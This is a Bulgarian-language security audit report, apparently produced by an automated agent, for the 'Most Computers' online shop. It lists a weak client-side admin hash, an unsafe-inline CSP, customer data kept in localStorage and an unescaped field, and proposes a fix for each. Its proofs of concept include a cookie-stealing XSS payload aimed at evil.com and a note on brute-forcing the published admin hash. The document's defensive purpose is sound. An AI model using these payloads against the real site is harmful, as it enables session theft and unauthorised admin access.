# Security Report — Most Computers
**Дата:** 2026-06-12
**Извършен от:** Security Auditor Agent
**npm audit:** 0 уязвимости ✅

---

## 🟠 HIGH — Клиентска admin автентикация с weak hash

- **Файл:** `js/admin.js:259`
- **Тип:** OWASP A07 — Identification and Authentication Failures
- **Описание:** Admin панелът е защитен само с djb2 hash (`_ADMIN_H = 3533399686`) съхранен в публичния JS файл. djb2 не е криптографски hash — може да се brute-force офлайн след изтегляне на admin.js. Rate limiting е в sessionStorage (resettable при нов tab).
- **PoC:** `curl https://mostcomputers.bg/js/admin.js | grep _ADMIN_H` → hash видим; брутфорс на 4-6 цифрен PIN за секунди.
- **Fix:** Добави server-side auth check (Supabase RLS role check) преди да се рендира admin панелът. Или мести admin зад отделен subdomain/route с Supabase session validation.
- **Статус:** Съществуващ design — НЕ Е КРИТИЧНО за текущата архитектура (SPA без server), но трябва да се подобри.

---

## 🟡 MEDIUM — CSP с `unsafe-inline`

- **Файл:** `index.html:7`
- **Тип:** OWASP A05 — Security Misconfiguration
- **Описание:** `Content-Security-Policy` включва `script-src 'self' 'unsafe-inline'` и `style-src 'self' 'unsafe-inline'`. Това анулира основната защита на CSP срещу XSS — ако атакуващ инжектира inline `<script>`, браузърът ще го изпълни.
- **PoC:** При успешен stored XSS (напр. admin панел), `<script>document.location='https://evil.com/?c='+document.cookie</script>` ще мине без блокиране.
- **Fix:** Замени `'unsafe-inline'` с nonce-based или hash-based CSP. За inline стилове: `'unsafe-inline'` е по-приемливо, но за scripts трябва nonce.
- **Статус:** Не е оправен — изисква рефактор на inline scripts.

---

## 🟡 MEDIUM — PII в localStorage (поръчки и адреси)

- **Файл:** `js/cart.js:922`, `js/cart.js:936`
- **Тип:** OWASP A02 — Cryptographic Failures
- **Описание:** `mc_orders` (name, email, phone, address, items) и `mc_saved_addr` се съхраняват в localStorage в plaintext. localStorage е достъпен от всеки JS на страницата (включително third-party, при XSS).
- **PoC:** `JSON.parse(localStorage.getItem('mc_orders'))` → пълни данни за всички поръчки.
- **Fix:** Това е стандартна практика за SPA без backend — не изисква промяна при сегашната архитектура. При добавяне на third-party scripts (реклами, чат) да се разгледа.
- **Статус:** Информационен — приемливо за текущата архитектура.

---

## 🟢 LOW — `r.name` без escHtml в cart.js recommendations panel

- **Файл:** `js/cart.js:87`
- **Тип:** OWASP A03 — Injection
- **Описание:** В панела "Клиентите купуват и..." продуктовото `r.name` се вмъква в innerHTML без `escHtml()`. Риска е нисък тъй като данните идват от вътрешния каталог (не от потребителски вход).
- **Fix:** `${escHtml(r.name.length > 32 ? r.name.substring(0,32)+'…' : r.name)}`
- **Статус:** Лесна 1-ред поправка.

---

## ✅ Какво е ДОБРЕ

| Проверка | Резултат |
|----------|---------|
| npm audit | 0 уязвимости |
| `escHtml()` покритие | Навсякъде — search, cart, orders, wishlist |
| `document.write()` (invoice/print) | Всички данни минават през `_h()` / `escHtml()` |
| Hardcoded пароли | Няма |
| Supabase anon key | Публичен по design — не е уязвимост |
| Auth flow | Supabase server-side, не client-only |
| Admin rate limiting | 5 опита / session |
| XSS в search | `highlightMatch()` прилага `escHtml()` преди regex |
| `onclick` с integer IDs | Безопасни — product IDs са integers |
| Wishlist share URL | `wishlist.join(',')` — само integers |

---

## Резюме

| ID | Severity | Описание | Статус |
|----|----------|----------|--------|
| SEC-001 | 🟠 HIGH | Admin client-side weak hash auth | Архитектурен — не се оправя веднага |
| SEC-002 | 🟡 MEDIUM | CSP unsafe-inline | Изисква nonce рефактор |
| SEC-003 | 🟡 MEDIUM | PII в localStorage | Приемливо за SPA |
| SEC-004 | 🟢 LOW | r.name без escHtml | Лесна поправка |

**Препоръчан следващ приоритет:** SEC-004 (1 ред), след това SEC-002 при следващ major рефактор.
